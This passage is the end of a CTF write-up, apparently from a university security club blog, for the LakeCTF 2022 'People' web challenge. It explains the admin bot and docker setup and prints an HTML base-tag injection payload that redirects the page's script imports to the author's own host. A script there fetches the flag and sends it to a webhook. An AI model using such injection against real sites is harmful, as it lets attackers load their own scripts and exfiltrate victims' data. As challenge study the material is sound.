</span></span></code></pre></div><p>In the script, I make a <code>GET</code> request to the location of the flag. If I am able to get the flag, I will send it to my webhook. If not, I will just redirect to the home page.</p><p>The url for the website is derived based on the admin bot script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>visit</span>(user_id, admin_token):
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;http://web:8080/profile/</span><span style=color:#e6db74>{</span>user_id<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> page<span style=color:#f92672>.</span>setCookie({<span style=color:#e6db74>&#39;name&#39;</span>: <span style=color:#e6db74>&#39;admin_token&#39;</span>, <span style=color:#e6db74>&#39;value&#39;</span>: admin_token, <span style=color:#e6db74>&#39;url&#39;</span>: <span style=color:#e6db74>&#39;http://web:8080&#39;</span>, <span style=color:#e6db74>&#39;httpOnly&#39;</span>: <span style=color:#66d9ef>True</span>, <span style=color:#e6db74>&#39;sameSite&#39;</span>: <span style=color:#e6db74>&#39;Strict&#39;</span>})
</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
</span></span></code></pre></div><p>TLDR: This admin script asks the bot to visit <code>web:8080</code> and set the cookie <code>admin_token</code> to the value of <code>admin_token</code>. This means that the bot will visit <code>web:8080/profile/{user_id}</code> with the admin cookie set.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>---
</span></span><span style=display:flex><span><span style=color:#f92672>web</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>container_name</span>: <span style=color:#ae81ff>web</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>build</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>context</span>: <span style=color:#ae81ff>.</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>dockerfile</span>: <span style=color:#ae81ff>Dockerfile.web</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>environment</span>:
</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>FLAG=EPFL{REDACTED}</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>depends_on</span>:
</span></span><span style=display:flex><span>    - <span style=color:#ae81ff>redis</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>ports</span>:
</span></span><span style=display:flex><span>    - <span style=color:#e6db74>&#34;8080:8080&#34;</span>
</span></span></code></pre></div><p>In docker, we can reference the hostname of a container by using their container name. The admin bot visits <code>web:8080</code> as that is the configuration set in the <code>docker-compose.yml</code> file as shown above. So in this case, my script prompts a get request to <code>web:8080/flag</code> instead of the full url.</p><p>After that the request is attached as a query parameter to the base url of my webhook site and the page was subsequently redirected to it.</p><p>The github pages is available at <a href=http://payload.jh123x.com/>payload.jh123x.com</a>. It was time to inject my base and see the result on <a href=https://webhook.site/>webhook.site</a>.</p><p>The payload that I used for the base injection is shown below and the github link upload is hosted at that url. This payload was only injected into the lab field.</p><p>This payload will work if you inject it into either of the fields as both of them are combined together to form the description in the title tag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;/<span style=color:#f92672>title</span>&gt;&lt;<span style=color:#f92672>base</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://payload.jh123x.com/&#34;</span> /&gt;
</span></span></code></pre></div><p>The <code>&lt;/title></code> closes the title tag and the <code>&lt;base></code> tag is the payload. The <code>href</code> attribute is the base url that the website will use to import from.</p><p>After tinkering around for a few hours, I manage to get the redirect and the flag was mine.</p><p><img loading=lazy src=/images/lakectf-people/final%20flag.png alt="Final flag shown on webhook.site"></p><p>The flag is attached to the url as a query parameter</p><p>Flag: <code>EPFL{Th1s_C5P_byp4ss_1s_b4sed}</code></p><p>If you want to try the challenge, you can find it <a href=https://github.com/Jh123x/payload/raw/main/people.zip>here</a>.</p><p><strong>Note</strong> Not sure why but it took a few tries to get the flag to show up.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://nusgreyhats.org/tags/writeups/>writeups</a></li><li><a href=https://nusgreyhats.org/tags/ctf/>ctf</a></li><li><a href=https://nusgreyhats.org/tags/web/>web</a></li><li><a href=https://nusgreyhats.org/tags/base-injection/>base injection</a></li></ul><nav class=paginav><a class=next href=https://nusgreyhats.org/posts/writeups/tamuctf-2022-obsessive-checking/><span class=title>Next Page Â»</span><br><span>[TamuCTF 2022] Obsessive Checking</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share [LAKECTF 2022] People on twitter" href="https://twitter.com/intent/tweet/?text=%5bLAKECTF%202022%5d%20People&url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f&hashtags=writeups%2cctf%2cweb%2cbaseinjection"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LAKECTF 2022] People on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f&title=%5bLAKECTF%202022%5d%20People&summary=%5bLAKECTF%202022%5d%20People&source=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LAKECTF 2022] People on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f&title=%5bLAKECTF%202022%5d%20People"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LAKECTF 2022] People on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LAKECTF 2022] People on whatsapp" href="https://api.whatsapp.com/send?text=%5bLAKECTF%202022%5d%20People%20-%20https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [LAKECTF 2022] People on telegram" href="https://telegram.me/share/url?text=%5bLAKECTF%202022%5d%20People&url=https%3a%2f%2fnusgreyhats.org%2fposts%2fwriteups%2flakectf-2022-people%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://nusgreyhats.org/>NUS Greyhats</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light"),document.getElementById("logo").src="/greyhats.png"):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"),document.getElementById("logo").src="/greyhats-dark.png")})</script></body></html>